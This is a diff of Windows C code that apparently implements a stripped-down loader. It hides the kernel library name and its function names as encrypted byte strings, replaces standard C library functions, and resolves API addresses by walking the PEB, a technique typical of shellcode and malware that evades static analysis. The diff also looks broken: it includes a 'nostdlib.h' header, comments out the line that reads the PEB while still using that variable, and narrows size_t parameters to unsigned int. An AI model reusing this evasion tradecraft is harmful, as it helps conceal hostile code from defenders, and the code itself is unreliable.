@@ -1,3 +1,4 @@
+#include <nostdlib.h>
 #include <windows.h>
 #include <winternl.h>
 
@@ -51,10 +52,6 @@ char encrypted_kernel_library_function_names[] = "\xa0\x96\x48\xdc\xc3\x48\x76\x
 int size_encrypted_kernel_library_function_names = 160;
 const char *kernel_library_function_names = NULL;
 
-// Variables for the C standard library
-
-static HANDLE global_windows_heap = NULL;
-
 // START C STANDARD LIBRARY REPLACEMENT
 
 // strcmp - compare strings
@@ -67,7 +64,7 @@ int strcmp(const char *s1, const char *s2) {
 }
 
 // memcpy - copy memory
-void *memcpy(void *dest, const void *src, size_t n) {
+void *memcpy(void *dest, const void *src, unsigned int n) {
     unsigned char *d = (unsigned char *)dest;
     const unsigned char *s = (const unsigned char *)src;
     while (n--) {
@@ -77,7 +74,7 @@ void *memcpy(void *dest, const void *src, size_t n) {
 }
 
 // memset - set memory
-void *memset(void *s, int c, size_t n) {
+void *memset(void *s, int c, unsigned int n) {
     unsigned char *p = (unsigned char *)s;
     while (n--) {
         *p++ = (unsigned char)c;
@@ -86,7 +83,7 @@ void *memset(void *s, int c, size_t n) {
 }
 
 
-void *malloc(size_t size) {
+void *malloc(unsigned int size) {
     return ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[3])(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 }
 
@@ -196,7 +193,7 @@ void init_kernel_library(void){
     kernel_library_name = (const wchar_t *) (encrypted_kernel_library_name + iv_length);
     kernel_library_function_names = encrypted_kernel_library_function_names + iv_length;
      
-    __asm__("movl %%fs:0x30, %0" : "=r"(peb_windows_structure));
+    //__asm__("movl %%fs:0x30, %0" : "=r"(peb_windows_structure));
     kernel_library_address = get_module_address(peb_windows_structure, kernel_library_name);
     for(int i = 0; i < number_kernel_library_functions; i++){
 	const char *function_name = get_function_by_number(kernel_library_function_names, i);
